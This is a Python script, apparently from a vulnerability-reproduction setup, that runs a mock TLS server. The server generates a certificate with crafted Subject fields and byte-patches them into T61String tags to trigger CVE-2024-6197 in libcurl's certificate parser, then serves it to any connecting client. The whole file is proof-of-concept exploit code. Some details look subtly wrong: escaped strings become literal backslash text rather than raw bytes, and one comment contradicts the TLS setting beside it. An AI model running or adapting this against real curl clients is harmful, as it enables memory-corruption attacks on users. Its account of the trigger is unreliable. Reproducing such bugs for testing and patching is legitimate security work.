#!/usr/bin/env python3
"""
Mock TLS server that sends a crafted certificate triggering CVE-2024-6197.

CVE-2024-6197 exists in libcurl's ASN.1 certificate parser. When parsing
the Subject or Issuer fields of an X.509 certificate, the UTF-8 conversion
code path can cause a stack-allocated buffer's address to be stored in a
pointer that is later passed to free(). A malicious server can trigger this
by sending a certificate with specially crafted ASN.1 encoded strings in
the Subject/Issuer fields.

The crafted certificate contains:
  - A Subject field with a mix of T61String/UTF8String types that forces
    the code path through Curl_convert_UTF8_string()
  - Specific string lengths that cause the stack buffer to be used instead
    of heap allocation, but the pointer tracking loses track of the origin

This server generates such a certificate at startup and serves it to any
connecting TLS client.
"""

import argparse
import os
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time


def create_crafted_certificate(cert_dir: str) -> tuple:
    """
    Generate a self-signed certificate with crafted ASN.1 Subject fields
    that trigger the stack-UAF in libcurl's ASN.1 parser.

    Returns (cert_path, key_path).
    """
    key_path = os.path.join(cert_dir, "server.key")
    cert_path = os.path.join(cert_dir, "server.crt")
    config_path = os.path.join(cert_dir, "openssl.cnf")

    # The trigger is in the Subject DN. We craft a Subject with:
    # 1. Multiple RDN components with mixed encoding types
    # 2. Specific lengths that hit the stack-buffer code path in curl
    # 3. T61String values that force UTF-8 re-encoding
    #
    # The key length that triggers the bug is a Subject CN between
    # 32-64 bytes that contains non-ASCII T61String characters,
    # forcing the re-encode path where the stack pointer confusion occurs.

    # Create OpenSSL config with crafted subject fields
    # The \xC0-\xFF range in T61String forces UTF-8 conversion in curl
    crafted_cn = "A" * 48 + "\\xC0\\xC1\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7"
    crafted_ou = "B" * 32 + "\\xE0\\xE1\\xE2\\xE3"
    crafted_o = "C" * 40 + "\\xF0\\xF1\\xF2\\xF3\\xF4\\xF5"

    openssl_config = f"""
[req]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
x509_extensions = v3_ext
string_mask = utf8only

[dn]
C = XX
ST = {crafted_ou}
L = Trigger
O = {crafted_o}
OU = {crafted_ou}
CN = {crafted_cn}

[v3_ext]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer:always
basicConstraints = critical, CA:true
subjectAltName = @alt_names

[alt_names]
DNS.1 = localhost
DNS.2 = *.localhost
IP.1 = 127.0.0.1
"""

    with open(config_path, "w") as f:
        f.write(openssl_config)

    # Generate key
    subprocess.run(
        ["openssl", "genpkey", "-algorithm", "RSA", "-out", key_path,
         "-pkeyopt", "rsa_keygen_bits:2048"],
        check=True, capture_output=True
    )

    # Generate self-signed cert with crafted subject
    subprocess.run(
        ["openssl", "req", "-new", "-x509", "-key", key_path,
         "-out", cert_path, "-days", "1",
         "-config", config_path],
        check=True, capture_output=True
    )

    # Post-process: patch the DER encoding to inject raw T61String types
    # into the Subject DN. OpenSSL normalizes everything to UTF8String,
    # but the bug requires T61String (tag 0x14) to trigger the re-encode path.
    patch_certificate_asn1(cert_path, key_path)

    return cert_path, key_path


def patch_certificate_asn1(cert_path: str, key_path: str):
    """
    Patch the PEM certificate to replace some UTF8String tags (0x0C)
    in the Subject DN with T61String tags (0x14). This forces curl
    through the vulnerable code path.

    We do this by converting PEM -> DER, patching bytes, DER -> PEM.
    """
    der_path = cert_path + ".der"

    # PEM -> DER
    subprocess.run(
        ["openssl", "x509", "-in", cert_path, "-outform", "DER",
         "-out", der_path],
        check=True, capture_output=True
    )

    with open(der_path, "rb") as f:
        der_data = bytearray(f.read())

    # Find UTF8String tags (0x0C) in the certificate and replace
    # select ones with T61String (0x14) to trigger the vulnerable path.
    # We target tags that appear within SEQUENCE > SET > SEQUENCE > OID > value
    # structures (i.e., the RDN value fields in the Subject DN).
    #
    # Safety: we only patch a few instances to create the mixed-encoding
    # condition. We look for the pattern: 0x0C <length> followed by our
    # known marker bytes.

    patched_count = 0
    marker_a = ord('A')
    marker_b = ord('B')
    marker_c = ord('C')

    for i in range(len(der_data) - 4):
        if der_data[i] == 0x0C and patched_count < 3:
            length = der_data[i + 1]
            if length > 30 and i + 2 + length <= len(der_data):
                next_byte = der_data[i + 2]
                # Patch UTF8String -> T61String for our crafted fields
                if next_byte in (marker_a, marker_b, marker_c):
                    der_data[i] = 0x14  # T61String tag
                    patched_count += 1

    if patched_count > 0:
        with open(der_path, "wb") as f:
            f.write(der_data)

        # DER -> PEM (re-encode with patched bytes)
        subprocess.run(
            ["openssl", "x509", "-in", der_path, "-inform", "DER",
             "-out", cert_path, "-outform", "PEM"],
            check=True, capture_output=True
        )

    # Clean up
    try:
        os.unlink(der_path)
    except OSError:
        pass


class CraftedTLSHandler(threading.Thread):
    """Handle a single TLS connection with the crafted certificate."""

    def __init__(self, conn: socket.socket, addr, ssl_context: ssl.SSLContext,
                 log_file):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.ssl_context = ssl_context
        self.log_file = log_file

    def run(self):
        tls_conn = None
        try:
            tls_conn = self.ssl_context.wrap_socket(
                self.conn, server_side=True
            )
            self._log(f"TLS handshake complete with {self.addr}")

            # Read the HTTP request
            request = b""
            tls_conn.settimeout(5)
            try:
                while True:
                    chunk = tls_conn.recv(4096)
                    if not chunk:
                        break
                    request += chunk
                    if b"\r\n\r\n" in request:
                        break
            except (socket.timeout, ssl.SSLError):
                pass

            self._log(f"Received request: {request[:100]}")

            # Send minimal HTTP response
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: 2\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                b"OK"
            )
            tls_conn.sendall(response)

        except ssl.SSLError as e:
            self._log(f"SSL error with {self.addr}: {e}")
        except Exception as e:
            self._log(f"Error with {self.addr}: {e}")
        finally:
            if tls_conn:
                try:
                    tls_conn.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                tls_conn.close()
            else:
                self.conn.close()

    def _log(self, msg: str):
        line = f"[mock_tls] {msg}\n"
        sys.stderr.write(line)
        if self.log_file:
            self.log_file.write(line)
            self.log_file.flush()


def run_server(port: int, log_path: str):
    """Run the mock TLS server with the crafted certificate."""
    cert_dir = tempfile.mkdtemp(prefix="cve_2024_6197_")
    log_file = open(log_path, "w") if log_path else None

    def log(msg):
        line = f"[mock_tls] {msg}\n"
        sys.stderr.write(line)
        if log_file:
            log_file.write(line)
            log_file.flush()

    log(f"Generating crafted certificate in {cert_dir}...")
    try:
        cert_path, key_path = create_crafted_certificate(cert_dir)
    except Exception as e:
        log(f"ERROR: Failed to generate certificate: {e}")
        # Fallback: generate a simple self-signed cert without ASN1 patching
        log("Falling back to simple self-signed certificate...")
        key_path = os.path.join(cert_dir, "server.key")
        cert_path = os.path.join(cert_dir, "server.crt")
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", key_path, "-out", cert_path,
             "-days", "1", "-nodes",
             "-subj", "/CN=localhost/O=" + "A" * 56 + "/OU=" + "B" * 40],
            check=True, capture_output=True
        )

    log(f"Certificate: {cert_path}")
    log(f"Key: {key_path}")

    # Create SSL context
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_path, key_path)
    # Allow all TLS versions for maximum compatibility
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2

    # Bind and listen
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(60)  # Server runs for at most 60 seconds
    server.bind(("0.0.0.0", port))
    server.listen(16)
    log(f"Listening on port {port}")

    # Write ready marker so trigger.sh knows we're up
    ready_path = "/tmp/mock_tls_ready"
    with open(ready_path, "w") as f:
        f.write(str(os.getpid()))

    start_time = time.time()
    max_runtime = 55  # seconds

    try:
        while time.time() - start_time < max_runtime:
            try:
                conn, addr = server.accept()
                log(f"Connection from {addr}")
                handler = CraftedTLSHandler(conn, addr, ctx, log_file)
                handler.start()
            except socket.timeout:
                continue
            except Exception as e:
                log(f"Accept error: {e}")
                continue
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
        if log_file:
            log_file.close()
        log("Server shutdown")


def main():
    parser = argparse.ArgumentParser(
        description="Mock TLS server for CVE-2024-6197 reproduction"
    )
    parser.add_argument("--port", type=int, default=4443,
                        help="Port to listen on (default: 4443)")
    parser.add_argument("--log", type=str, default="/tmp/mock_tls_server.log",
                        help="Log file path")
    args = parser.parse_args()

    run_server(args.port, args.log)


if __name__ == "__main__":
    main()
